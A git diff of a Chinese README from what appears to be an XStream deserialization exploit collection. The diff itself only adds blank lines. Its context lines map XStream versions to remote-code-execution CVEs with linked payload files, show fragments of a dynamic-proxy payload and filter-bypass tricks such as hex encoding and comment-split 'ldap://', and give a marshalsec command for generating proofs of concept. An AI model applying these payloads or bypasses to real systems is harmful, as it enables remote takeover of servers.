@@ -28,10 +28,15 @@
 ## 利用规则
 
   <1.4.6        [CVE-2013-7285](exp/RCE/CVE-2013-7285.xml)
+  
  =1.4.10       [CVE-2019-10173](exp/RCE/CVE-2019-10173.xml)  && [CVE-2013-7285](exp/RCE/CVE-2013-7285.xml)
+ 
 <=1.4.13      [CVE-2020-26217](exp/RCE/CVE-2020-26217.xml)
+
 <=1.4.15      [CVE-2021-21345](exp/RCE/CVE-2021-21345.xml) &&  [CVE-2021-21344](exp/RCE/CVE-2021-21344.xml)  &&  [CVE-2021-21351](exp/RCE/CVE-2021-21351.xml)
+
 <=1.4.16      [CVE-2021-29505](exp/RCE/CVE-2021-29505.xml)
+
 <=1.4.17      [CVE-2021-39141](exp/RCE/CVE-2021-39141.xml) && [CVE-2021-39144](exp/RCE/CVE-2021-39144.xml) && [CVE-2021-39146](exp/RCE/CVE-2021-39146.XML)
 
 
@@ -56,6 +61,8 @@ eg：
     </dynamic-proxy>
 </sorted-set>
 ```
+
+
 
 ```xml
 1. 16进制绕过
@@ -95,11 +102,15 @@ ld<!-- test -->ap://xxxxx
 </test>
 ```
 
+
 ## 工具生成poc
+
 
 ```
 java.exe -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream
 ```
+
+
 
 配合yso生成xstream的exp。添加Xstream组件依赖
 
